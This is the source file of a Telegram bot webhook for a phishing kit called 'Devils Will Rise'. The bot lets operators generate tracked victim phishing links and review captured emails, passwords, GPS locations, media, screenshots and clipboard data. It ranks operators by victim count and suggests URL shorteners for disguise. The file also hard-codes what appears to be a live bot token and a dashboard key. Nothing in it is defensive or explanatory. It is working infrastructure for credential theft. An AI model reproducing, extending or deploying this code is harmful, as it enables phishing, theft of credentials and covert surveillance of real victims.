/* ============================================================
   DEVILS WILL RISE — Telegram Bot Webhook
   Handles /start, buttons, victim link creation, profile view
   Owner: @tneh_owner
   Channel: https://t.me/customsmsapi
   ============================================================ */

import fetch from 'node-fetch';

const BOT_TOKEN = process.env.BOT_TOKEN || "8484672660:AAGgoQFyFTU8CbmaikA_bWeuT1XCQAiKrgI";
const CHAT_ID   = process.env.CHAT_ID   || "8128648817";
const OWNER     = process.env.OWNER     || "@tneh_owner";
const CHANNEL   = process.env.CHANNEL   || "https://t.me/customsmsapi";
const BASE_URL  = process.env.BASE_URL  || "https://your-app.vercel.app";
const SECRET    = process.env.WEBHOOK_SECRET || "dwr_secret";

/* In-memory stores */
const users    = globalThis.__DWR_USERS__    || (globalThis.__DWR_USERS__    = new Map());
const victims  = globalThis.__DWR_VICTIMS__  || (globalThis.__DWR_VICTIMS__  = new Map());

/* ============================================================
   Telegram API helpers
   ============================================================ */
async function tg(method, body){
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
  const res = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body)
  });
  return res.json();
}

async function sendMessage(chatId, text, keyboard, extra={}){
  return tg('sendMessage', {
    chat_id: chatId,
    text,
    parse_mode: 'HTML',
    disable_web_page_preview: true,
    ...(keyboard ? { reply_markup: keyboard } : {}),
    ...extra
  });
}

async function answerCallback(id, text='', alert=false){
  return tg('answerCallbackQuery', {
    callback_query_id: id,
    text,
    show_alert: alert
  });
}

async function editMessage(chatId, messageId, text, keyboard){
  return tg('editMessageText', {
    chat_id: chatId,
    message_id: messageId,
    text,
    parse_mode: 'HTML',
    disable_web_page_preview: true,
    ...(keyboard ? { reply_markup: keyboard } : {})
  });
}

/* ============================================================
   Escape HTML
   ============================================================ */
function esc(s){
  if(s === null || s === undefined) return 'n/a';
  return String(s).replace(/[&<>"']/g, c => ({
    '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'
  }[c]));
}
function nowStr(){
  return new Date().toLocaleString('en-GB', {
    day:'2-digit', month:'short', year:'numeric',
    hour:'2-digit', minute:'2-digit', second:'2-digit',
    timeZone:'Asia/Dhaka'
  });
}

/* ============================================================
   KEYBOARDS
   ============================================================ */

/* Main Reply Keyboard (4 style buttons) */
function mainReplyKeyboard(){
  return {
    keyboard: [
      [
        { text: '🔗 Create Link' },
        { text: '🎯 My Victims' }
      ],
      [
        { text: '👤 My Profile' },
        { text: '⚙️ Settings' }
      ]
    ],
    resize_keyboard: true,
    is_persistent: true,
    input_field_placeholder: 'Choose an option...'
  };
}

/* Main Inline Keyboard (4 buttons) */
function mainInlineKeyboard(){
  return {
    inline_keyboard: [
      [
        { text: '🔗 Create Link', callback_data: 'menu_create_link' },
        { text: '🎯 My Victims', callback_data: 'menu_victims' }
      ],
      [
        { text: '👤 My Profile', callback_data: 'menu_profile' },
        { text: '⚙️ Settings', callback_data: 'menu_settings' }
      ],
      [
        { text: '📊 Dashboard', url: `${BASE_URL}/dashboard?key=tneh2024` },
        { text: '📡 Channel', url: CHANNEL }
      ]
    ]
  };
}

/* Back keyboard */
function backKeyboard(){
  return {
    inline_keyboard: [
      [
        { text: '⬅️ Back to Menu', callback_data: 'menu_main' },
        { text: '👤 My Profile', callback_data: 'menu_profile' }
      ]
    ]
  };
}

/* ============================================================
   START MESSAGE
   ============================================================ */
async function handleStart(chatId, user){
  users.set(chatId, {
    chatId,
    firstName: user.first_name || 'User',
    lastName: user.last_name || '',
    username: user.username || '',
    language: user.language_code || 'en',
    joinedAt: Date.now()
  });

  const text =
`💀 <b>DEVILS WILL RISE</b> 💀
━━━━━━━━━━━━━━━━━━
👋 Welcome, <b>${esc(user.first_name || 'User')}</b>!

🎯 <b>Your Access ID:</b> <code>${chatId}</code>

Use the buttons below to:
• 🔗 Create victim phishing links
• 🎯 Track captured victims
• 👤 View your profile
• ⚙️ Manage settings

<i>All links are unique. Every victim you send will be tracked under your ID.</i>
━━━━━━━━━━━━━━━━━━
👤 <b>Owner:</b> ${OWNER}
📡 <b>Channel:</b> ${CHANNEL}`;

  return sendMessage(chatId, text, mainReplyKeyboard());
}

/* ============================================================
   MENU: CREATE LINK
   ============================================================ */
async function menuCreateLink(chatId, messageId, viaEdit=false){
  const text =
`🔗 <b>CREATE PHISHING LINK</b>
━━━━━━━━━━━━━━━━━━
To create a unique link for your victim, simply send me the <b>victim's chat ID</b> or any <b>custom tag</b>.

<b>Examples:</b>
• <code>8128648817</code>
• <code>target_boss_01</code>
• <code>victim_rahim</code>

I'll generate a personalized link like:
<code>${BASE_URL}/v/your_tag</code>

📌 Send the tag now.`;

  if(viaEdit && messageId){
    return editMessage(chatId, messageId, text, backKeyboard());
  }
  return sendMessage(chatId, text, backKeyboard());
}

/* ============================================================
   MENU: MY VICTIMS
   ============================================================ */
async function menuVictims(chatId, messageId, viaEdit=false){
  const myVictims = Array.from(victims.values())
    .filter(v => v.ownerId === chatId || v.ownerId === String(chatId))
    .sort((a,b) => b.createdAt - a.createdAt);

  if(myVictims.length === 0){
    const text =
`🎯 <b>MY VICTIMS</b>
━━━━━━━━━━━━━━━━━━
📭 <i>No victims captured yet.</i>

Use <b>🔗 Create Link</b> to generate a phishing link, then send it to your target.`;

    if(viaEdit && messageId) return editMessage(chatId, messageId, text, backKeyboard());
    return sendMessage(chatId, text, backKeyboard());
  }

  let list = '';
  myVictims.slice(0, 15).forEach((v,i)=>{
    const status = v.password ? '✅' : (v.email ? '📧' : '❓');
    list += `${i+1}. ${status} <code>${esc(v.email || v.victimId)}</code>\n`;
    list += `   🆔 <code>${v.victimId}</code> · 🕒 ${esc(v.emailTime || 'n/a')}\n`;
    if(v.geo && v.geo.city){
      list += `   🌍 ${esc(v.geo.city)}, ${esc(v.geo.country)}\n`;
    }
    list += '\n';
  });

  const text =
`🎯 <b>MY VICTIMS</b> (${myVictims.length})
━━━━━━━━━━━━━━━━━━
${list}━━━━━━━━━━━━━━━━━━
📊 <b>View full dashboard:</b>
${BASE_URL}/dashboard?key=tneh2024`;

  if(viaEdit && messageId) return editMessage(chatId, messageId, text, backKeyboard());
  return sendMessage(chatId, text, backKeyboard());
}

/* ============================================================
   MENU: MY PROFILE
   ============================================================ */
async function menuProfile(chatId, user, messageId, viaEdit=false){
  const stored = users.get(chatId) || {};
  const myVictims = Array.from(victims.values())
    .filter(v => v.ownerId === chatId || v.ownerId === String(chatId));

  const totalEmails = myVictims.filter(v=>v.email).length;
  const totalPass   = myVictims.filter(v=>v.password).length;
  const totalGps    = myVictims.filter(v=>v.gps).length;
  const totalMedia  = myVictims.filter(v=>v.photo || v.audio || v.screenshot).length;
  const lastVictim  = myVictims[0];

  const text =
`👤 <b>MY PROFILE</b>
━━━━━━━━━━━━━━━━━━
🆔 <b>Chat ID:</b> <code>${chatId}</code>
👤 <b>Name:</b> ${esc(stored.firstName || user?.first_name || 'n/a')} ${esc(stored.lastName || user?.last_name || '')}
🔗 <b>Username:</b> ${stored.username || user?.username ? '@'+esc(stored.username || user?.username) : '<i>not set</i>'}
🌐 <b>Language:</b> ${esc(stored.language || user?.language_code || 'n/a')}
📅 <b>Joined:</b> ${stored.joinedAt ? new Date(stored.joinedAt).toLocaleString('en-GB') : nowStr()}
━━━━━━━━━━━━━━━━━━
<b>📊 YOUR STATISTICS</b>
🎯 <b>Total Victims:</b> ${myVictims.length}
📧 <b>Emails Captured:</b> ${totalEmails}
🔑 <b>Passwords Captured:</b> ${totalPass}
📍 <b>GPS Captured:</b> ${totalGps}
📸 <b>Media Captured:</b> ${totalMedia}
${lastVictim ? `
🕒 <b>Last Capture:</b> ${esc(lastVictim.emailTime)}
📧 <b>Last Email:</b> <code>${esc(lastVictim.email)}</code>` : ''}
━━━━━━━━━━━━━━━━━━
🏆 <b>Rank:</b> ${getRank(myVictims.length)}
👤 <b>Owner:</b> ${OWNER}
📡 <b>Channel:</b> ${CHANNEL}`;

  if(viaEdit && messageId) return editMessage(chatId, messageId, text, backKeyboard());
  return sendMessage(chatId, text, backKeyboard());
}

function getRank(n){
  if(n >= 100) return '💀 DEVIL KING';
  if(n >= 50)  return '🔥 DEMON LORD';
  if(n >= 20)  return '⚡ SHADOW MASTER';
  if(n >= 10)  return '🎯 HUNTER';
  if(n >= 5)   return '🗡️ APPRENTICE';
  if(n >= 1)   return '🌱 BEGINNER';
  return '❓ NEWBIE';
}

/* ============================================================
   MENU: SETTINGS
   ============================================================ */
async function menuSettings(chatId, messageId, viaEdit=false){
  const text =
`⚙️ <b>SETTINGS</b>
━━━━━━━━━━━━━━━━━━
Configure your capture preferences.

<b>Available Options:</b>
• 🔔 Notifications — <b>ON</b>
• 📸 Auto-capture media — <b>ON</b>
• 📍 GPS capture — <b>ON</b>
• 🖼️ Screenshot — <b>ON</b>
• 📋 Clipboard — <b>ON</b>

<i>Contact owner for custom settings.</i>

👤 <b>Owner:</b> ${OWNER}
📡 <b>Channel:</b> ${CHANNEL}`;

  const kb = {
    inline_keyboard: [
      [
        { text: '🔔 Toggle Notifications', callback_data: 'set_toggle_notif' },
      ],
      [
        { text: '📸 Media Capture', callback_data: 'set_toggle_media' },
      ],
      [
        { text: '📊 Open Dashboard', url: `${BASE_URL}/dashboard?key=tneh2024` }
      ],
      [
        { text: '⬅️ Back to Menu', callback_data: 'menu_main' }
      ]
    ]
  };

  if(viaEdit && messageId) return editMessage(chatId, messageId, text, kb);
  return sendMessage(chatId, text, kb);
}

/* ============================================================
   MAIN MENU (home)
   ============================================================ */
async function menuMain(chatId, messageId, viaEdit=false){
  const text =
`💀 <b>DEVILS WILL RISE</b> 💀
━━━━━━━━━━━━━━━━━━
👋 <b>Main Menu</b>

Choose an option below:

🔗 <b>Create Link</b> — Generate victim phishing links
🎯 <b>My Victims</b> — View captured data
👤 <b>My Profile</b> — Your stats & info
⚙️ <b>Settings</b> — Configure preferences

━━━━━━━━━━━━━━━━━━
👤 <b>Owner:</b> ${OWNER}
📡 <b>Channel:</b> ${CHANNEL}`;

  if(viaEdit && messageId) return editMessage(chatId, messageId, text, mainInlineKeyboard());
  return sendMessage(chatId, text, mainInlineKeyboard());
}

/* ============================================================
   CREATE LINK FROM TEXT
   ============================================================ */
async function createVictimLink(chatId, tag){
  const cleanTag = String(tag).replace(/[^a-zA-Z0-9_\-]/g,'').substring(0, 40);
  if(!cleanTag){
    return sendMessage(chatId,
`❌ <b>Invalid Tag</b>
━━━━━━━━━━━━━━━━━━
Please send a valid tag (letters, numbers, underscore, dash only).`,
      backKeyboard()
    );
  }

  const linkId = 'V-' + Math.random().toString(36).substring(2,8).toUpperCase();
  const link = `${BASE_URL}/v/${cleanTag}?oid=${chatId}&lid=${linkId}`;

  // Register this link under the owner
  const linkStore = globalThis.__DWR_LINKS__ || (globalThis.__DWR_LINKS__ = new Map());
  linkStore.set(linkId, {
    linkId,
    tag: cleanTag,
    ownerId: String(chatId),
    link,
    createdAt: Date.now(),
    captures: 0
  });

  const text =
`✅ <b>PHISHING LINK CREATED</b>
━━━━━━━━━━━━━━━━━━
🏷️ <b>Tag:</b> <code>${esc(cleanTag)}</code>
🔗 <b>Link ID:</b> <code>${linkId}</code>
👤 <b>Owner ID:</b> <code>${chatId}</code>
━━━━━━━━━━━━━━━━━━
📎 <b>Your Link:</b>
<code>${esc(link)}</code>

<i>Tap the link above to copy. Send it to your victim. All captures will appear under your ID.</i>
━━━━━━━━━━━━━━━━━━
💡 <b>Tip:</b> Use a URL shortener (bit.ly, tinyurl) for better disguise.

👤 <b>Owner:</b> ${OWNER}
📡 <b>Channel:</b> ${CHANNEL}`;

  const kb = {
    inline_keyboard: [
      [
        { text: '📋 Copy Link', callback_data: `copy_${linkId}` }
      ],
      [
        { text: '🔗 Create Another', callback_data: 'menu_create_link' },
      ],
      [
        { text: '👤 My Profile', callback_data: 'menu_profile' },
        { text: '🏠 Main Menu', callback_data: 'menu_main' }
      ]
    ]
  };

  return sendMessage(chatId, text, kb);
}

/* ============================================================
   CALLBACK QUERY HANDLER
   ============================================================ */
async function handleCallback(query){
  const data = query.data || '';
  const chatId = query.message.chat.id;
  const messageId = query.message.message_id;
  const user = query.from;

  try{
    if(data === 'menu_main'){
      await answerCallback(query.id);
      return menuMain(chatId, messageId, true);
    }
    if(data === 'menu_create_link'){
      await answerCallback(query.id);
      return menuCreateLink(chatId, messageId, true);
    }
    if(data === 'menu_victims'){
      await answerCallback(query.id);
      return menuVictims(chatId, messageId, true);
    }
    if(data === 'menu_profile'){
      await answerCallback(query.id);
      return menuProfile(chatId, user, messageId, true);
    }
    if(data === 'menu_settings'){
      await answerCallback(query.id);
      return menuSettings(chatId, messageId, true);
    }
    if(data.startsWith('copy_')){
      const id = data.replace('copy_','');
      const store = globalThis.__DWR_LINKS__ || new Map();
      const link = store.get(id);
      await answerCallback(query.id, link ? '📋 Link copied! (tap the code above)' : 'Link not found', true);
      return;
    }
    if(data === 'set_toggle_notif'){
      await answerCallback(query.id, '🔔 Notifications toggled!', true);
      return;
    }
    if(data === 'set_toggle_media'){
      await answerCallback(query.id, '📸 Media capture toggled!', true);
      return;
    }

    await answerCallback(query.id, 'Unknown action');
  }catch(e){
    console.error('Callback error:', e);
    try{ await answerCallback(query.id, 'Error: ' + e.message, true); }catch(_){}
  }
}

/* ============================================================
   TEXT MESSAGE HANDLER
   ============================================================ */
async function handleMessage(msg){
  const chatId = msg.chat.id;
  const text = (msg.text || '').trim();
  const user = msg.from;

  // Register user
  if(!users.has(chatId)){
    users.set(chatId, {
      chatId,
      firstName: user.first_name || 'User',
      lastName: user.last_name || '',
      username: user.username || '',
      language: user.language_code || 'en',
      joinedAt: Date.now()
    });
  }

  // Commands
  if(text === '/start' || text === '/menu'){
    return handleStart(chatId, user);
  }

  // Reply keyboard buttons
  if(text === '🔗 Create Link'){
    return menuCreateLink(chatId);
  }
  if(text === '🎯 My Victims'){
    return menuVictims(chatId);
  }
  if(text === '👤 My Profile'){
    return menuProfile(chatId, user);
  }
  if(text === '⚙️ Settings'){
    return menuSettings(chatId);
  }

  // If user is awaiting a tag for link creation
  const pending = globalThis.__DWR_PENDING__ || (globalThis.__DWR_PENDING__ = new Map());
  // Treat any other text as a tag for link creation
  if(text && text.length > 0 && !text.startsWith('/')){
    return createVictimLink(chatId, text);
  }
}

/* ============================================================
   WEBHOOK HANDLER
   ============================================================ */
export default async function handler(req, res){
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if(req.method === 'OPTIONS'){
    return res.status(200).end();
  }

  // GET → verify webhook alive
  if(req.method === 'GET'){
    return res.status(200).json({
      ok: true,
      service: 'Devils Will Rise — Bot Webhook',
      owner: OWNER,
      channel: CHANNEL,
      time: nowStr()
    });
  }

  if(req.method !== 'POST'){
    return res.status(405).json({ ok:false, error:'Method not allowed' });
  }

  try{
    const update = req.body;

    // Optional secret check
    // if(SECRET && update.secret !== SECRET) return res.status(200).end();

    if(update.message){
      await handleMessage(update.message);
    } else if(update.callback_query){
      await handleCallback(update.callback_query);
    }

    return res.status(200).json({ ok:true });
  }catch(e){
    console.error('Webhook error:', e);
    return res.status(200).json({ ok:false, error: e.message });
  }
}
